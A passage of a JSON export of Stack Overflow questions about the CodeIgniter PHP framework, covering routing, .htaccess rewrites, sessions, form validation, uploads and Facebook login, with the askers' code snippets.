lines</p>\n\n<pre><code>DOCTYPE\nHEAD\nMETA CHARSET\n/HEAD\nBODY\n2 Paragraph tags (that are properly opened and closed.\n</code></pre>\n\n<p>When I use the web developer FireFox addon, and choose the \"Edit HTML\" option, there is a red dot, and all the tags up to <code>&lt;title&gt;</code> disappears. There is also no body tag, and the same two paragraph tags that are shown red in FireFox source viewer is also gone. In other words, the red means errors of some sort, but I see no errors whatsoever in the source.</p>\n\n<p>Here it is shown, the parts that indicate as errors:</p>\n\n<pre><code>&lt;!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"&gt;\n&lt;html xmlns=\"http://www.w3.org/1999/xhtml\" xml:lang=\"en\" lang=\"en\"&gt;\n    &lt;head&gt;\n\n&lt;/head&gt;\n&lt;body class=\"page\"&gt;\n\n&lt;p&gt;\n    &lt;div class=\"photo-box photo-box-right\" id=\"photo-box-test-image-619\"&gt;\n        &lt;div class=\"photo-box-photo\"&gt;\n            &lt;img src=\"http://localhost/assets/uploads/images/logo.png\" title=\"Test image\" alt=\"Test image\" /&gt;\n        &lt;/div&gt;\n        &lt;div class=\"photo-box-title\"&gt;\n            &lt;span class=\"photo-box-head\" title=\"Test image\"&gt;Test image&lt;/span&gt;\n        &lt;/div&gt;\n    &lt;/div&gt;\n    Qualitative data approximates, characterizes or describes but does not measure the attributes, characteristics, properties of a phenomenon.  Data could take the form of textual transcriptions of interviews, focus groups or dialogues, photographs, audio and video recordings.\n&lt;/p&gt;\n&lt;p&gt;\n    &lt;div class=\"photo-box photo-box-left\" id=\"photo-box-test-image-476\"&gt;\n        &lt;div class=\"photo-box-photo\"&gt;\n            &lt;img src=\"http://localhost/assets/uploads/images/sparta.jpg\" title=\"Test image\" alt=\"Test image\" /&gt;\n        &lt;/div&gt;\n        &lt;div class=\"photo-box-title\"&gt;\n            &lt;span class=\"photo-box-head\" title=\"Test image\"&gt;Test image&lt;/span&gt;\n        &lt;/div&gt;\n    &lt;/div&gt;\n    Quantitative data defines attributes in terms of values with numerical significance and can be represented as matrixes of numbers of responses, maps, tables or graphs.\n&lt;/p&gt;\n</code></pre>\n\n<p>I can not see any errors in the HTML. I see no hidden control characters in any normal editor that I can get my hands on (Notepad++, UltraEdit, Notepad, Wordpad) but I do see it in the \"Edit HTML\" screen of the Web Developer toolbar.</p>\n\n<p>Here is what I have done to try and resolve this:</p>\n\n<ol>\n<li>Recreate the file and retyping the supposed affected lines.</li>\n<li>Used various text editors to try and see the wrong file.</li>\n<li>Removed all recently added content and code in the file to see if this stops at any point (no luck...)</li>\n<li>Read all the posts I can find about \"non-SGML character\" I could find here and on Google, nothing seem to answer my question.</li>\n<li>Deleted the post in the database and recreated that (for incase this is a problem with database content). Not resolved.</li>\n<li>Converted all tables to MyISAM (some, including the content table, were InnoDB)</li>\n<li>Checked if other pages that does not draw its content from the database has the same problem (such as contact form) and it does the same.</li>\n<li>Played around with various character sets and encodings in my database and HTML source, as well as my PHP ini file. None affect the outcome.</li>\n<li>Changed the code page in all my text editors to various types to try and see this hidden non-SGML character.</li>\n<li>Copied all the system and application files (excluding the obvious changes such as CSS and templates and modified modules) over from another site based on the same version of CodeIgniter that works well.</li>\n</ol>\n\n<p>Anything else you think I can do?</p>\n\n<p>From the above, I conclude that either the custom modules (unlikely), the CSS stylesheets, the added jQuery libraries that are different between the sites (uniform.js, buttons.js) or the templates and views used is having some sort of pukefest on my happiness.</p>\n\n<p>Please advise if you can think of something else I have missed...</p>\n\n<p>Thanks!</p>\n\n<p>Kobus</p>\n\n<p>EDIT: Now that I am allowed to add images, I decided to make a few screenshots to explain the problem better. Maybe it helps... I initially thought it may be the whitespace in the title tag, but wasn't that...<img src=\"http://i.stack.imgur.com/BFhHS.png\" alt=\"Screenshot 1\"><img src=\"http://i.stack.imgur.com/SCJVV.png\" alt=\"Screenshot 2\"></p>\n"},{"tags":["codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":19,"score":0,"question_id":12758931,"title":"loading the model in the constructor function in codeigniter. is that good practice or no?","body":"<p>I would like to know...can I load the model in my constructor function instead of loading it for each function within that controller?</p>\n\n<p>Lets say that I have 5 functions that use same model. Instad of calling the same model in all 5 functions, should I load the controller in the construcor function like this?</p>\n\n<p>Is this good practice or no??</p>\n\n<pre><code>if ( ! defined('BASEPATH')) exit('No direct script access allowed');\n\nclass BackOfficeUsers extends MY_Controller \n{\n\n    // constructor function \n    public function __construct() \n    {\n        parent::__construct();\n        $this-&gt;load-&gt;model('backOfficeUsersModel'); // load it here??\n    } // end of constructor function\n</code></pre>\n\n<p>Regards,Zoran</p>\n"},{"tags":["php","facebook","codeigniter"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":40,"score":-1,"question_id":12758874,"title":"user is logged in facebook but not in my website","body":"<p>I am having this issue that after login from my website to facebook using facebook login user gets logged in to facebook but it didn't logged in to my website.\ncurrently i am using codeigniter 1.7.2 and php 5.3.5.</p>\n\n<p>Here is my controller code:</p>\n\n<pre><code>                     if($user){\n\n        $this-&gt;facebook_model-&gt;set_session_data($user);\n\n        //if($this-&gt;session-&gt;userdata('is_app_user')==0)            \n        redirect('home');\n\n        $this-&gt;session-&gt;unset_userdata('uid');\n        //redirect('localhost/bevsponsor');\n\n        }else{\n\n        $data['login_url']=$this-&gt;facebook_model-&gt;get_login_url();\n        }   \n</code></pre>\n\n<p>Here is my model code:\n                       function set_session_data(){//set session variable return true if set else false\n    try {</p>\n\n<pre><code>    $user=$this-&gt;get_user();\n    $fqlResult   =   $this-&gt;facebook-&gt;api('/'.$user);\n    //print_r($fqlResult);\n\n    $fb_data = array(\n                        'uid' =&gt; $fqlResult['id'],\n                        'name' =&gt; $fqlResult['first_name'],\n                    'full_name' =&gt; $fqlResult['name'],\n                    'email' =&gt;$fqlResult['email'],\n                    'is_logged_in' =&gt;'1'\n            );      \n\n    echo \"&lt;pre&gt;\";\n    print_r($fb_data); die;\n</code></pre>\n"},{"tags":["php","codeigniter","tankauth"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":69,"score":2,"question_id":12444318,"title":"Codeigniter: function runs everytime page is refreshed","body":"<p>Ok, so i have a test page right now that is just testing my point system. Pretty much when the user his the button, it gives them 5 points. The problem right now is everytime i refresh the page the user gets 5 points. What is up with this? If necessary I can post the libraries and models functions. Here is the controller and view:</p>\n\n<p>welcome.php view:</p>\n\n<pre><code>Hi, &lt;strong&gt;&lt;?php echo $username; ?&gt;&lt;/strong&gt;! &lt;?php echo $fullname ?&gt; is now logged in now. &lt;/br&gt;\nYou have &lt;?php echo $points; ?&gt; Points.&lt;/br&gt;\n&lt;?php echo anchor('/auth/logout/', 'Logout'); ?&gt;&lt;/br&gt;\n&lt;?php echo form_open('add_points'); ?&gt;\n&lt;?php echo form_submit('/auth/add_points/', 'Get 5 free Points!'); ?&gt;\n&lt;?php echo form_close(); ?&gt;\n&lt;?php echo var_dump($pointhistory); ?&gt;\n</code></pre>\n\n<p>welcome.php controller:</p>\n\n<pre><code>&lt;?php if (!defined('BASEPATH')) exit('No direct script access allowed');\n\nclass Welcome extends CI_Controller\n{\n        function __construct()\n        {\n                parent::__construct();\n\n                $this-&gt;load-&gt;helper(array('form','url'));\n                $this-&gt;load-&gt;library('tank_auth');\n                $this-&gt;lang-&gt;load('tank_auth');\n        }\n\n        function index()\n        {\n                if (!$this-&gt;tank_auth-&gt;is_logged_in()) {\n                        redirect('/auth/login/');\n                } else {\n                        $data['user_id']        = $this-&gt;tank_auth-&gt;get_user_id();\n                        $data['username']       = $this-&gt;tank_auth-&gt;get_username();\n                        $data['fullname']       = $this-&gt;tank_auth-&gt;get_fullname();\n                        $data['points']         = $this-&gt;tank_auth-&gt;get_points();\n                        $data['pointhistory']   = $this-&gt;tank_auth-&gt;get_point_history();\n                        $this-&gt;load-&gt;view('welcome', $data);\n                }\n        }\n}\n</code></pre>\n"},{"tags":["php","forms","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":12758496,"title":"Codeigniter Form Open How To Remove index.php","body":"<p>In Codeigniter when I use <code>form_open()</code> function it adds <code>index.php</code> to url.<br/>How can remove it ?<br/>Note : I removed index.php from url with htaccess.</p>\n"},{"tags":["php","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":296,"score":0,"question_id":4964906,"title":"How to auto-instantiate a library in CodeIgniter","body":"<p>I'm using a really basic library in Codeigniter. In order to use it I need to pass in a number of config parameters using a config function. My library currently requires me to instantiate it before I can call the config, i.e., I have to use it as below:</p>\n\n<pre><code>$this-&gt;load-&gt;library('Library');\n$instance = new Library();\n$instance-&gt;config($configparams);\n</code></pre>\n\n<p>I'd like to use it like standard CodeIgniter libraries:</p>\n\n<pre><code>$this-&gt;load-&gt;library('Library');\n$this-&gt;library-&gt;config($configparams);\n</code></pre>\n\n<p>What do I need to add to the library in order to have it auto-instantiate? The code is as below:</p>\n\n<pre><code>class Library {\n\n     function config($configparams){\n       ...\n     }\n}\n</code></pre>\n\n<p><strong>This is working now. I swear it wasn't working before I posted on SO! Thanks for posts.</strong></p>\n"},{"tags":["php","codeigniter","module","messaging"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":80,"score":0,"question_id":12721772,"title":"Mahana Module for CodeIgniter","body":"<p>I am making an application in CodeIgniter and I need a Messaging Library Module there and I got a Library name Mahana. The Link is as follows.</p>\n\n<p><a href=\"https://github.com/jrmadsen67/Mahana-Messaging-library-for-CodeIgniter/tree/master/application\" rel=\"nofollow\">https://github.com/jrmadsen67/Mahana-Messaging-library-for-CodeIgniter/tree/master/application</a></p>\n\n<p>But I am unable to apply it as it has no controller and View portion. I am very new to CodeIgniter. Can any one provide me any link of total Mahana Librery or any other Messaging Library for CodeIgniter</p>\n\n<p>Thank You</p>\n"},{"tags":["php","jquery","codeigniter"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":45,"score":1,"question_id":12757760,"title":"How to show validation message in controller Codeigniter","body":"<p>How  can I use {ci_form_validation field='title' error='true'} in the controller ?</p>\n\n<p>I have this code </p>\n\n<pre><code>$this-&gt;load-&gt;library('form_validation');\n$this-&gt;form_validation-&gt;set_rules('title', $this-&gt;lang-&gt;line('title'), 'trim|required|min_length[3]|xss_clean');   \n$this-&gt;form_validation-&gt;set_rules('fahad', $this-&gt;lang-&gt;line('blog'), 'trim|required|min_length[20]|xss_clean'); \n$this-&gt;form_validation-&gt;set_rules('writer', $this-&gt;lang-&gt;line('writer'), 'trim|required|alpha_dash|min_length[3]|xss_clean');\n</code></pre>\n\n<p>I want to print error message in controller because I am using jquery. </p>\n"},{"tags":["php","codeigniter","session","google-chrome"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":101,"score":0,"question_id":12711045,"title":"Losing session variables/cookies only in Chrome [pretty URL's & .htaccess]","body":"<p>this issue has been around and there's a few different versions of it but I'm stumped. First I'll let you know what my setup is...</p>\n\n<p>CodeIgniter install\nWorks fine on all browsers except chrome...\nI've narrowed the problem down to pretty URL's and .htaccess\nsessions are stored in DB</p>\n\n<p>Basically if I use codeigniter's default bootstrap structure index.php/controller it works fine but when I use a mod rewrite .htaccess the sessions get lost, only in chrome. </p>\n\n<p><strong>Some of the things I saw out there, that i've tried...</strong></p>\n\n<p><em>favicon.ico in root</em> <a href=\"http://bit.ly/UFsYjj\" rel=\"nofollow\">http://bit.ly/UFsYjj</a> and <a href=\"http://bit.ly/JPUzub\" rel=\"nofollow\">bit.ly/JPUzub</a></p>\n\n<p><em>Switching to cookies and setting paths</em> <a href=\"http://bit.ly/JPUzub\" rel=\"nofollow\">bit.ly/JPUzub</a></p>\n\n<p>for me it really boils down to the fact that the htaccess removal of index.php is causing the session issue. my codeigniter settings are as follows(note* if tried all different configurations of these settings like no domain etc.):</p>\n\n<pre><code>$config['sess_cookie_name']     = 'cisession';\n$config['sess_expiration']      = 99999;\n$config['sess_expire_on_close'] = TRUE;\n$config['sess_encrypt_cookie']  = FALSE;\n$config['sess_use_database']    = TRUE;\n$config['sess_table_name']      = 'ci_sessions';\n$config['sess_match_ip']        = FALSE;\n$config['sess_match_useragent'] = FALSE;\n$config['sess_time_to_update']  = 300;\n\n$config['cookie_prefix']    = \"\";\n$config['cookie_domain']    = \".mydomain.com\";\n$config['cookie_path']      = \"/\";\n$config['cookie_secure']    = FALSE;\n</code></pre>\n\n<p>And my htaccess was as follows(now it's currently blank...):</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n    RewriteEngine On\n    RewriteBase /\n\n    RewriteEngine on\nRewriteCond $1 !^(index\\.php|assets|images|robots\\.txt|favicon\\.ico)\nRewriteRule ^(.*)$ index.php/$1 [L]\n\nRewriteCond %{HTTP_HOST} ^mydomain.com [NC]\nRewriteRule ^(.*)$ http://www.mydomain.com/$1 [L,R=301]\n\n    #Removes access to the system folder by users.\n    #Additionally this will allow you to create a System.php controller,\n    #previously this would not have been possible.\n    #'system' can be replaced if you have renamed your system folder.\n    RewriteCond %{REQUEST_URI} ^system.*\n    RewriteRule ^(.*)$ /index.php?/$1 [L]\n\n    #When your application folder isn't in the system folder\n    #This snippet prevents user access to the application folder\n    #Submitted by: Fabdrol\n    #Rename 'application' to your applications folder name.\n    RewriteCond %{REQUEST_URI} ^application.*\n    RewriteRule ^(.*)$ /index.php?/$1 [L]\n\n    #Checks to see if the user is attempting to access a valid file,\n    #such as an image or css document, if this isn't true it sends the\n    #request to index.php\n    RewriteCond %{REQUEST_FILENAME} !-f\n    RewriteCond %{REQUEST_FILENAME} !-d\n    RewriteRule ^(.*)$ index.php?/$1 [L]\n&lt;/IfModule&gt;\n\n&lt;IfModule !mod_rewrite.c&gt;\n    # If we don't have mod_rewrite installed, all 404's\n    # can be sent to index.php, and everything works as normal.\n    # Submitted by: ElliotHaughin\n\n    ErrorDocument 404 /index.php\n\n\n\n&lt;/IfModule&gt; \n</code></pre>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":12757305,"title":"codeigniter Cannot access protected property MY_Loader::$_ci_cached_vars and extract cached variables","body":"<p>After upgrade of Codeigniter i get this message</p>\n\n<blockquote>\n  <p>Cannot access protected property MY_Loader::$_ci_cached_vars</p>\n</blockquote>\n\n<p>i know that this property is now protected so what can i do here</p>\n\n<pre><code>extract($CI-&gt;load-&gt;_ci_cached_vars); // extract cached variables\n</code></pre>\n\n<p>i don't know hwo to use <code>get_var</code> method now becous property is protected</p>\n\n<p>this is <code>get_var</code> method</p>\n\n<pre><code>/**\n     * Get Variable\n     *\n     * Check if a variable is set and retrieve it.\n     *\n     * @param   array\n     * @return  void\n     */\n    public function get_var($key)\n    {\n        return isset($this-&gt;_ci_cached_vars[$key]) ? $this-&gt;_ci_cached_vars[$key] : NULL;\n    }\n</code></pre>\n\n<p>how to refactor this?</p>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":15,"score":0,"question_id":12757130,"title":"codeigniter Cannot access protected property MY_Loader::$_ci_cached_vars","body":"<p>After upgrade of Codeigniter i get this message</p>\n\n<blockquote>\n  <p>Cannot access protected property MY_Loader::$_ci_cached_vars</p>\n</blockquote>\n\n<p>i know that this property is now protected so i change</p>\n\n<pre><code>else if (isset($CI-&gt;load-&gt;_ci_cached_vars[$key]))\n    {\n        $val = $CI-&gt;load-&gt;_ci_cached_vars[$key];\n    }\n</code></pre>\n\n<p>to</p>\n\n<pre><code>if (isset($CI-&gt;load-&gt;get_var($key)))\n    {\n        $val = $CI-&gt;load-&gt;get_var($key);\n    }\n</code></pre>\n\n<p>but then i get</p>\n\n<blockquote>\n  <p>Can't use method return value in write context</p>\n</blockquote>\n\n<p>this is <code>get_var</code> method</p>\n\n<pre><code>/**\n     * Get Variable\n     *\n     * Check if a variable is set and retrieve it.\n     *\n     * @param   array\n     * @return  void\n     */\n    public function get_var($key)\n    {\n        return isset($this-&gt;_ci_cached_vars[$key]) ? $this-&gt;_ci_cached_vars[$key] : NULL;\n    }\n</code></pre>\n\n<p>what can i do, just use</p>\n\n<pre><code>if ($CI-&gt;load-&gt;get_var($key)) != null)  {\n        $val = $CI-&gt;load-&gt;get_var($key);\n    }\n</code></pre>\n\n<p>without isset? i want to check if is not NULL, becouse <code>get_var</code> method return null</p>\n\n<p>or is  <code>if ($CI-&gt;load-&gt;get_var($key)))  {</code> check enough?</p>\n"},{"tags":["php","mysql","codeigniter","mysql-real-escape-string"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":78,"score":1,"question_id":12638392,"title":"mysql_real_escape_string(): Access denied in codeigniter","body":"<p>I am using Codeigniter.i want to use string in <code>$_POST</code> value from search form which may contain special characters such as apostrophe('),(;) etc .How can my mysql query ignore these characters so that i could select from/save my <code>$_POST['search']</code> values into the database?</p>\n\n<p>Whenever i use the mysql_real_escape_string() function.it give me: \n<code>mysql_real_escape_string(): Access denied error.</code></p>\n\n<p>My code looks like this:</p>\n\n<pre><code>$query = \"SELECT * FROM products WHERE  \nproduct_name='\".mysql_real_escape_string($_POST['search']).\"'\";\n\n$this-&gt;db-&gt;query($query);\n</code></pre>\n\n<p>How can deal with this problem in codeigniter? Thanks</p>\n"},{"tags":["database","codeigniter","radio-button"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":24,"score":0,"question_id":12756364,"title":"Incrementing value in a database codeigniter","body":"<p>I am trying to incrementing a value of an option in the database when the uer chooses it when voting. I am getting no errors, but the database is not updating. What am i doing wrong?</p>\n\n<p>IN my controller:</p>\n\n<pre><code>public function vote($option_id)\n{\n    $this-&gt;load-&gt;helper('form');\n    $this-&gt;load-&gt;library('form_validation');\n\n    $this-&gt;form_validation-&gt;set_rules('options', 'required');\n\n    if ($this-&gt;form_validation-&gt;run() === FALSE)\n    {\n\n        $this-&gt;load-&gt;helper('html');\n        $data['content'] = $this-&gt;load-&gt;view('user/vote','', TRUE);\n        $this-&gt;load-&gt;view('templates/master', $data);\n    }\n    else{\n\n        $checkedoption = intval($_POST['options']);\n        $optionid = $this-&gt;polls_model-&gt;get_option($option_id);\n        $this-&gt;polls_model-&gt;set_votes($checkedoption, $option_id);\n        $this-&gt;load-&gt;helper('html');\n        $data['content'] = $this-&gt;load-&gt;view('user/success','', TRUE);\n        $this-&gt;load-&gt;view('templates/master', $data);\n\n    }\n\n\n} \n</code></pre>\n\n<p>IN my model, I have functions like this:</p>\n\n<pre><code>//this gets the id of the option to vote on\n    function get_option($option_id)\n    {\n        $query = $this-&gt;db-&gt;get_where('pollOption', array('option_id'=&gt;$option_id));\n        return $query-&gt;row_array();       \n    }\n\n// THis updates the vount_count column in the database:\n        public function set_votes($checkedoption, $option_id)\n        {\n\n            $this-&gt;db-&gt;where('option_id', $checkedoption);\n            $this-&gt;db-&gt;set('vote_count', 'vote_count+1', FALSE);\n            $this-&gt;db-&gt;update('pollOption');\n\n        }\n</code></pre>\n\n<p>and in my view, I have this:</p>\n\n<pre><code>$poll_id = $polls_item['id'];\n\n$query = $this-&gt;db-&gt;get_where('pollOption', array('poll_id' =&gt; $poll_id));\n$queryResult = $query-&gt;result_array();?&gt;\n\n&lt;html&gt;\n    &lt;head&gt;\n\n&lt;script type=\"text/javascript\" src=\"&lt;?php echo base_url();?&gt;js/jquery.js\"&gt;&lt;/script&gt;      \n&lt;/head&gt;\n\n&lt;body&gt;\n&lt;?php echo form_open('user/vote/' .$poll_id); \n\nforeach ($queryResult as $row):?&gt;\n\n&lt;input type=\"radio\" name=\"options\" value = \"&lt;?php echo $row['option_item'];?&gt;\" &gt; &lt;?php echo $row['option_item'];?&gt; &lt;br&gt;\n\n&lt;?php endforeach;?&gt;\n\n&lt;input type=\"submit\" name=\"submit_vote\" value=\"Vote\"&gt;\n\n&lt;?php echo form_close(); ?&gt;\n</code></pre>\n\n<p>Thankyou.</p>\n"},{"tags":["php","codeigniter","facebook-login"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":12757044,"title":"facebook connect login in codeigniter 1.7.2","body":"<p>Using codeigniter 1.7.2 version</p>\n\n<p>link building on facebook login button: <a href=\"https://www.facebook.com/login.php?api_key=\" rel=\"nofollow\">https://www.facebook.com/login.php?api_key=</a>\"<strong><em>*</em>***</strong>\"&amp;cancel_url=http://%3A...................</p>\n\n<p>is this the correct link that should be building or i should be changing it to\n<a href=\"https://www.facebook.com/dialog/oauth?client_id=\" rel=\"nofollow\">https://www.facebook.com/dialog/oauth?client_id=</a>\"\".........     </p>\n"},{"tags":["query","codeigniter","search","routes"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":12756550,"title":"CodeIgniter and query string issue","body":"<p>Im not to good in php and codeigniter gives me maximum. My site is a search engine and after i do a search, url of my site is like this: <strong>mysite.com/?search=eminem&amp;type=mp3</strong> and i don't like it.\nI want to do it so when i type search eminem to give me this url: <strong>mysite.com/eminem/mp3</strong>\nHere is code from CI</p>\n\n<pre><code>&lt;?php\n\nclass Pages extends CI_Controller {\n\n    public function view($page = 'home')\n    {\n        if ( ! file_exists('application/views/pages/'.$page.'.php'))\n    {\n        // Whoops, we don't have a page for that!\n        show_404();\n    }\n\n    $data['title'] = ucfirst($page); // Capitalize the first letter\n    $this-&gt;load-&gt;view('templates/header', $data);\n    $this-&gt;load-&gt;view('pages/'.$page, $data);\n    $this-&gt;load-&gt;view('templates/footer', $data);\n    }\n}\n</code></pre>\n\n<p>what other code do i have to add here to transform the qwery strings to paths?</p>\n\n<p>here is routes.php</p>\n\n<pre><code>$route['default_controller'] = 'pages/view';\n$route['(:any)'] = 'pages/view/$1';\n\n$route['404_override'] = '';\n</code></pre>\n\n<p>Here is my search form from home.php</p>\n\n<pre><code>&lt;form id=\"searchwrapper\" name=\"searchform\"&gt;                                          &lt;input type=\"text\" class=\"searchbox\" id=\"txtSearch\" name=\"search\" /&gt;                                        &lt;input type=\"image\" src=\"../images/empty.png\" class=\"searchbox_submit\"/&gt;                                   \n\n&lt;p id=\"circ\"&gt;\n   &lt;input  type=\"radio\" id=\"mp3\" name=\"type\" checked value=\"mp3\"/&gt;\n   &lt;label class=\"circ-btn normal\" for=\"mp3\"&gt;Mp3&lt;/label&gt;&lt;/p&gt;\n&lt;p id=\"circ\"&gt;                   \n   &lt;input type=\"radio\" id=\"album\" name=\"type\" &lt;?php echo $radio2;?&gt; value=\"album\"/&gt;\n   &lt;label class=\"circ-btn normal\" for=\"album\"&gt;Album&lt;/label&gt;&lt;/p&gt;\n&lt;/form&gt;\n</code></pre>\n\n<p>here is .htaccess</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n        RewriteEngine On\n        RewriteBase /ci/\n        #Checks to see if the user is attempting to access a valid file,\n        #such as an image or css document, if this isn't true it sends the\n        #request to index.php\n        RewriteCond %{REQUEST_FILENAME} !-f\n        RewriteCond %{REQUEST_FILENAME} !-d\n        RewriteRule ^(.*)$ index.php?/$1 [L]\n&lt;/IfModule&gt;\n</code></pre>\n"},{"tags":["codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":106,"score":0,"question_id":7650315,"title":"CodeIgniter uses index.php","body":"<p>I have codeigniter installed in root/igniter folder.</p>\n\n<p>under root/igniter, I have the following .htaccess file:</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{REQUEST_URI} ^/system.*\nRewriteRule ^(.*)$ index.php?/$1 [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.+)$ index.php?/$1 [L]\n</code></pre>\n\n<p>Pages open just as I would expect them to without using 'index.php'.\nSo, my home page lies at <code>http://example.com/igniter</code> and my registration page at <code>http://example.com/igniter/registration</code> opens as well.</p>\n\n<p>However, in my registration form, the submit button which is handled by a CI controller redirects to </p>\n\n<p><code>http://example.com/igniter/index.php/registration</code></p>\n\n<p>I have made sure that my config.php under applications/config has</p>\n\n<pre><code>$config['index_page'] = \"\";\n</code></pre>\n\n<p>This is what my Registration controller looks like:</p>\n\n<pre><code>public function index()\n    {\n        $this-&gt;load-&gt;helper(array('form', 'url'));\n        $this-&gt;load-&gt;model('Registration_Model');       \n        $this-&gt;load-&gt;library('form_validation');\n        $this-&gt;form_validation-&gt;set_error_delimiters('&lt;div class=\"error\"&gt;', '&lt;/div&gt;');\n\n        $this-&gt;form_validation-&gt;set_rules('username', 'Username', 'trim|required|min_length[5]|max_length[12]|callback_username_check|xss_clean');\n        $this-&gt;form_validation-&gt;set_rules('password', 'Password', 'trim|required|min_length[6]|max_length[12]|matches[passconf]');\n        $this-&gt;form_validation-&gt;set_rules('passconf', 'Password Confirmation', 'trim|required');\n        $this-&gt;form_validation-&gt;set_rules('email', 'Email', 'trim|required|valid_email|callback_email_check');\n\n        if ($this-&gt;form_validation-&gt;run() == FALSE)\n        {\n            $this-&gt;load-&gt;view('registration');\n        }\n        else\n        {\n            //input data into database here\n            $username = strtolower($_POST['username']);\n            $password = md5($_POST['password']);\n            $email = strtolower($_POST['email']);\n\n            $data = array\n                    (\n                        'username' =&gt; $username,\n                        'password' =&gt; $password,\n                        'email' =&gt; $email\n                    );\n\n            $this-&gt;Registration_Model-&gt;addUser($data);  \n            $this-&gt;load-&gt;view('registrationsuccess');\n        }\n    }\n</code></pre>\n\n<p>As far as I can see, I am not explicitly asking the controller to redirect to index.php/registration.</p>\n"},{"tags":["php","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":75,"score":2,"question_id":12754349,"title":"Defining a Root Path","body":"<p>I'm looking for a way to define a config variable as being the root path of my website. What's the nicest way to define this. I am using Codeigniter. </p>\n\n<pre><code>$config['root_path'] = ?\n</code></pre>\n\n<p>This is for my site_config file in my config folder.</p>\n\n<pre><code>/\n/dev\n/dev/application\n/dev/application\n/dev/application/config\n/dev/application/config/site_config.php\n/dev/system/\n/dev/assets/\n/public_html\n</code></pre>\n"},{"tags":["codeigniter","file-upload","mime-types"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":527,"score":0,"question_id":10416731,"title":"Codeigniter upload not accepting .doc files","body":"<p>I’m getting the following error when I try to upload:</p>\n\n<p>“The filetype you are attempting to upload is not allowed.”.</p>\n\n<p><strong>Here is my mime for .doc:</strong></p>\n\n<p>‘doc’ => array(‘application/msword’,‘application/doc’,‘appl/text’,‘application/vnd.msword’,‘application/word’,‘application/winword’,‘application/vnd.ms-word’,‘application/x-msw6’,‘application/x-msword’),</p>\n\n<p>As you can see I already tried to make up for it by adding more mimes. I have no idea what the problem can be… the file is .doc. Note that uploading pdf's do work! I'm also using a mac.</p>\n\n<p><strong>Here is my code:</strong></p>\n\n<pre><code>$sntError = $this-&gt;uploadFile($id,'notes','doc|pdf|docx');\n\nprivate function uploadFile ($id,$input,$extensions) {\n $this-&gt;load-&gt;library('upload');\n $config['allowed_types'] = $extensions;\n $config['upload_path'] = './upload/sermon/'. $input;\n $config['file_name'] = $input .'-'. $id;\n $config['max_size'] = '10000';\n $config['overwrite'] = true;\n $this-&gt;upload-&gt;initialize($config);\n $uploaded = $this-&gt;upload-&gt;do_upload($input);\n\n $errors = $this-&gt;upload-&gt;display_errors('&lt;div class=\"error\"&gt;', '&lt;/div&gt;');\n\n if (!$errors &amp;&amp; $uploaded) {\n  $fileData = $this-&gt;upload-&gt;data();\n  $this-&gt;saveSermonAttachments($id,$input,$fileData['file_name']);\n } else {\n  return $errors;\n }\n} \n</code></pre>\n"},{"tags":["css","image","codeigniter","links","subfolder"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":481,"score":1,"question_id":10475158,"title":"/images or /inc/css links not working in CodeIgniter subfolder","body":"<p>I have CI installed on Godaddy subdomain in www.mydomain.com/test\nMy home page loads as well as a link to my /news page </p>\n\n<p>the problem I'm having is I can't get any images to load or my CSS files to load. I'm calling my CSS from my header file by:</p>\n\n<pre><code>&lt;link rel=\"stylesheet\" type=\"text/css\" href=\"&lt;?php echo base_url() ?&gt;inc/css/base.css\" media=\"all\"/&gt; \n</code></pre>\n\n<p>I'm calling my header image by:</p>\n\n<pre><code>&lt;img src=\"images/logo.png\"&gt;\n</code></pre>\n\n<p>when I right click on X where image should be, and choose open in new tab so i can see what url it's pointing to... it seems good.  <a href=\"http://mydomain.com/test/images/logo.png\" rel=\"nofollow\">http://mydomain.com/test/images/logo.png</a></p>\n\n<p>I echoed my site_url and base_url and they seem configured correctly pointing to:\n<a href=\"http://www.mydomain.com/test/\" rel=\"nofollow\">http://www.mydomain.com/test/</a></p>\n\n<p>my structure is:\n/test  </p>\n\n<p>1 index.php</p>\n\n<p>2 .htaccess</p>\n\n<p>3 /system</p>\n\n<p>4 /application</p>\n\n<ul>\n<li>/controllers   </li>\n<li>/images   </li>\n<li>/inc<br>\n---                 /css<br>\n---                 /js    </li>\n<li>/views</li>\n</ul>\n\n<p>after reviewing stackoverflow questions... I pasted my .htaccess that sits in my www.mydomain.com/test folder with CI to be:</p>\n\n<pre><code>RewriteEngine On\nRewriteBase /test\n\nRewriteCond %{REQUEST_URI} ^system.*\nRewriteCond $1 !^(index\\.php|images|robots\\.txt)\n\nRewriteCond %{REQUEST_URI} ^application.*\nRewriteRule ^(.*)$ 